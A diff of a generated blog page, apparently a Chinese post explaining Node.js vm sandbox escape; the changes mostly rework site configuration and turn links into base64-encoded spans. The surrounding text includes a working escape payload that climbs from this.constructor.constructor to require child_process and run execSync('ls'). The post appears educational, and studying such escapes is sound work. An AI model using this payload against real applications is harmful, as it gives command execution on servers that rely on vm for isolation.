@@ -8,6 +8,7 @@
   <link rel="apple-touch-icon" sizes="180x180" href="/images/prof.jpg">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/prof.jpg">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/prof.jpg">
+  <meta name="msvalidate.01" content="E8B6DE7DCFB7B9BA2CD14AB2A553B0EB">
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -17,7 +18,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"qi4l.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":"ture","height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"qi4l.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":"ture","height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="前言分析 yapi 的漏洞时接触到就随写">
 <meta property="og:type" content="article">
@@ -82,7 +83,7 @@
       <p class="site-title">QI4L的沉思录</p>
       <i class="logo-line"></i>
     </a>
-      <p class="site-subtitle" itemprop="description">千里之行，始于足下</p>
+      <p class="site-subtitle" itemprop="description">VMP,反病毒,hook,syscall,逆向</p>
   </div>
 
   <div class="site-nav-right">
@@ -152,10 +153,7 @@
 </div>
   <div class="links-of-author animated">
       <span class="links-of-author-item">
-        <a href="https://github.com/qi4L" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;qi4L" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:nuxm771@163.com" title="E-Mail → mailto:nuxm771@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FpNEw=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;qi4L"><i class="fab fa-github fa-fw"></i>GitHub</span>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="rss → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i>rss</a>
@@ -249,7 +247,7 @@
 <blockquote>
 <p>一个常见的用例是在不同的 V8 上下文中运行代码。 这意味着被调用的代码与调用的代码具有不同的全局对象。</p>
 </blockquote>
-<p>可以通过使对象<a target="_blank" rel="noopener" href="http://nodejs.cn/api/vm.html#vm_what_does_it_mean_to_contextify_an_object">上下文隔离化来提供上下文</a>。 被调用的代码将上下文中的任何属性都视为全局变量。 由调用的代码引起的对全局变量的任何更改都将会反映在上下文对象中。</p>
+<p>可以通过使对象<span class="exturl" data-url="aHR0cDovL25vZGVqcy5jbi9hcGkvdm0uaHRtbCN2bV93aGF0X2RvZXNfaXRfbWVhbl90b19jb250ZXh0aWZ5X2FuX29iamVjdA==">上下文隔离化来提供上下文<i class="fa fa-external-link-alt"></i></span>。 被调用的代码将上下文中的任何属性都视为全局变量。 由调用的代码引起的对全局变量的任何更改都将会反映在上下文对象中。</p>
 <figure class="highlight js"><figcaption><span>js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> context = &#123; <span class="attr">x</span>: <span class="number">2</span> &#125;;</span><br><span class="line">vm.<span class="title function_">createContext</span>(context); <span class="comment">// 创建上下文隔离化对象。</span></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">&#x27;x += 40; var y = 17;&#x27;</span>;</span><br><span class="line"><span class="comment">// `x` and `y` 是上下文中的全局变量。</span></span><br><span class="line"><span class="comment">// 最初，x 的值为 2，因为这是 context.x 的值。</span></span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(context.<span class="property">x</span>); <span class="comment">// 42</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(context.<span class="property">y</span>); <span class="comment">// 17</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 1; y 没有定义。</span></span><br></pre></td></tr></table></figure>
 
 <p>上面这个例子完美的诠释了下面这张图的内容(很明显的是沙盒环境代码只能读取 VM 上下文的数据)</p>
@@ -275,11 +273,11 @@
 <p>把原型链污染中的常用Payload转换过来如下</p>
 <figure class="highlight js"><figcaption><span>js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(</span><br><span class="line">    <span class="string">`</span></span><br><span class="line"><span class="string">    var exec = this.constructor.constructor;</span></span><br><span class="line"><span class="string">    var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();</span></span><br><span class="line"><span class="string">    console.log(require(&#x27;child_process&#x27;).execSync(&quot;ls&quot;).toString());</span></span><br><span class="line"><span class="string">`</span>,</span><br><span class="line">    ctx</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/166747">NodeJS沙箱逃逸分析</a></p>
-<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api/vm.html">官方API</a></p>
-<p><a target="_blank" rel="noopener" href="https://aotu.io/notes/2020/10/28/node-sandbox-escape-analysis/">凹凸实验室</a></p>
-<p><a target="_blank" rel="noopener" href="https://lequ7.com/guan-yu-javascriptnodejs-sha-he-tao-yi-fen-xi.html">关于javascript:nodejs-沙盒逃逸分析</a></p>
-<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000012672620">NPM酷库：vm2，安全的沙箱环境</a></p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTY2NzQ3">NodeJS沙箱逃逸分析<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cDovL25vZGVqcy5jbi9hcGkvdm0uaHRtbA==">官方API<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9hb3R1LmlvL25vdGVzLzIwMjAvMTAvMjgvbm9kZS1zYW5kYm94LWVzY2FwZS1hbmFseXNpcy8=">凹凸实验室<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9sZXF1Ny5jb20vZ3Vhbi15dS1qYXZhc2NyaXB0bm9kZWpzLXNoYS1oZS10YW8teWktZmVuLXhpLmh0bWw=">关于javascript:nodejs-沙盒逃逸分析<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjY3MjYyMA==">NPM酷库：vm2，安全的沙箱环境<i class="fa fa-external-link-alt"></i></span></p>
 
     </div>
 
